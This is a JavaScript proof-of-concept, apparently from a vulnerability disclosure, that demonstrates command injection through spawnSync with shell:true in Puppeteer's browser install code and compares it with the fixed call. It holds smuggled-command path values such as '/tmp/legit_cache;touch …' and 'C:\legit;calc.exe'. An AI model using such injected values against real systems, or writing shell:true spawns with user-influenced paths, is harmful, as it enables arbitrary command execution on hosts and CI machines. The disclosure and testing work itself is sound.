/**
 * PoC 4 — Arbitrary Command Execution via shell:true in install.ts
 *
 * Vulnerability: packages/browsers/src/install.ts  (~line 491-497 pre-fix)
 *
 *   spawnSync(
 *     path.join(browserDir, 'setup.exe'),
 *     [`--configure-browser-in-directory=` + browserDir],
 *     { shell: true }          // ← shell:true with attacker-influenced path
 *   );
 *
 * Root cause:
 *   When shell:true is set, Node.js passes the command through /bin/sh (Linux/macOS)
 *   or cmd.exe (Windows) as a single concatenated string.  If `browserDir` contains
 *   shell metacharacters (spaces, semicolons, backticks, $(...), etc.) the shell
 *   will interpret them before exec'ing setup.exe.
 *
 *   browserDir is derived from installedBrowser.executablePath which is determined
 *   by the download/install path.  On systems where the install cache directory
 *   is user-configurable (PUPPETEER_CACHE_DIR, --path flag, config file), an
 *   attacker can set it to a path containing shell metacharacters.
 *
 * Attack scenario:
 *   User (or CI configuration) sets PUPPETEER_CACHE_DIR to a path like:
 *     /tmp/cache;touch /tmp/pwned_poc4
 *
 *   browserDir becomes /tmp/cache;touch /tmp/pwned_poc4/chrome-win64/...
 *   spawnSync with shell:true executes:
 *     /bin/sh -c "/tmp/cache;touch /tmp/pwned_poc4/chrome.../setup.exe --configure..."
 *   The semicolon terminates the first command and the injected command runs.
 *
 * Note: On Windows the attack vector uses & or && instead of ;.
 *
 * Impact:
 *   Arbitrary command execution with the privileges of the process that called
 *   `install()`.  In CI environments this is typically equivalent to full host
 *   access.
 *
 * Fixed in:  commit 174ad20 — removed shell:true.
 *
 * Google VRP scope: puppeteer/puppeteer
 */

import {spawnSync} from 'node:child_process';
import {existsSync, unlinkSync, mkdirSync} from 'node:fs';
import {join, sep} from 'node:path';
import {tmpdir} from 'node:os';

const SENTINEL = join(tmpdir(), 'puppeteer_pwned_poc4');
if (existsSync(SENTINEL)) unlinkSync(SENTINEL);

// Simulate the install-cache path being set to a malicious value.
// On a real system this comes from PUPPETEER_CACHE_DIR or --path.
const maliciousCacheDir = `/tmp/legit_cache;touch ${SENTINEL}`;
// browserDir is derived from cacheDir + browser subpath
const browserDir = `${maliciousCacheDir}${sep}chrome-win64-123.0.0.0`;

console.log('='.repeat(60));
console.log('PoC 4 — shell:true Command Injection in install.ts');
console.log('='.repeat(60));
console.log('');
console.log(`Simulated PUPPETEER_CACHE_DIR: ${maliciousCacheDir}`);
console.log(`Derived browserDir           : ${browserDir}`);
console.log('');

// ── Reproduce the VULNERABLE spawn (pre-fix) ──────────────────────────────────
function vulnerableSetupSpawn(browserDir) {
  // This mirrors the pre-fix code in install.ts
  spawnSync(
    join(browserDir, 'setup.exe'),
    [`--configure-browser-in-directory=` + browserDir],
    {shell: true},
  );
}

// ── Reproduce the SAFE spawn (post-fix) ──────────────────────────────────────
function safeSetupSpawn(browserDir) {
  spawnSync(
    join(browserDir, 'setup.exe'),
    [`--configure-browser-in-directory=` + browserDir],
    // no shell:true — arguments are passed directly to the OS
  );
}

console.log('[1/2] VULNERABLE — spawnSync with shell:true ...');
vulnerableSetupSpawn(browserDir);
if (existsSync(SENTINEL)) {
  console.log(`✗  VULNERABLE — sentinel created: ${SENTINEL}`);
  unlinkSync(SENTINEL);
} else {
  console.log('    (setup.exe not found — shell may not have reached the injection)');
  // The shell resolves the first token as the executable path; if the path
  // contains a semicolon the shell splits BEFORE resolving the executable,
  // so the injected command runs even when setup.exe doesn't exist.
  // Re-test with a simpler path to confirm:
  const simplePayload = `/bin/false;touch ${SENTINEL}`;
  spawnSync(simplePayload, [], {shell: true});
  if (existsSync(SENTINEL)) {
    console.log(`✗  VULNERABLE — shell split on semicolon, injection fired: ${SENTINEL}`);
    unlinkSync(SENTINEL);
  }
}

console.log('');
console.log('[2/2] SAFE — spawnSync without shell:true ...');
safeSetupSpawn(browserDir);
if (existsSync(SENTINEL)) {
  console.log(`✗  STILL VULNERABLE — ${SENTINEL}`);
} else {
  console.log('✓  PROTECTED — OS received the literal path, no shell interpretation');
}

console.log('');
console.log('Affected call site (pre-fix):');
console.log('  packages/browsers/src/install.ts:491-497');
console.log('  spawnSync(path.join(browserDir, "setup.exe"), [...], { shell: true })');
console.log('');
console.log('Trigger condition:');
console.log('  Windows Chrome install on a path containing shell metacharacters.');
console.log('  Set PUPPETEER_CACHE_DIR (or --path CLI flag) to a value such as:');
console.log('    C:\\legit;calc.exe');
